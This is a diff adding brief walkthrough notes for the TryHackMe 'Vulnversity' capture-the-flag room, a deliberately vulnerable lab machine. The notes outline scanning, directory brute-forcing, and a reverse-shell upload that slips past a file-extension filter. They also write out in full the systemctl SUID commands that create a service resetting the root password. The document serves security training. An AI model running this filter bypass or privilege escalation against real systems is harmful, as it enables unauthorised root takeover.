@@ -1,0 +1,25 @@
+Link: https%3A%2F%2Ftryhackme.com%2Fr%2Froom%2Fvulnversity&v=WWoNtGe-_t4
+
+Steps:
+1- Scan the open ports
+2- Use gobuster to show the subdirectories --> find internal page
+3- We can upload reveseshell on the internalpage (not accept .php files we can upload with .phtml)
+4- Use gobuster to show the subdirectories from internal directory --> find uploads page
+5- Run the netcat listener
+6- Open the reveseshell from the uploads page on the website
+7- Now we are in the machine
+8- Enter the pass: /home/bill/ to find the user.txt file and get the first flag
+9- find the files that can be opened by root only, command: find / -type f -perm -4000 2>/dev/null --> find some passes
+10- Try to find a way to exploit the machine by this files from GTFOBins.com (we found the file that only has exploitation on GTFOBins is systemctl)
+find this commands to by the root
+*AF=$(mktemp).service
+*echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "echo 'root:beboPass123!' | chpasswd"
+[Install]
+WantedBy=multi-user.target' > $AF
+*/bin/systemctl link $AF
+*/bin/systemctl enable --now $AF
+11- use these commands on the machine and try to be root by using the new password --> su sudo --> Enter the password --> Now you are the root
+12- Read the /root/root.txt to find the second flag
+
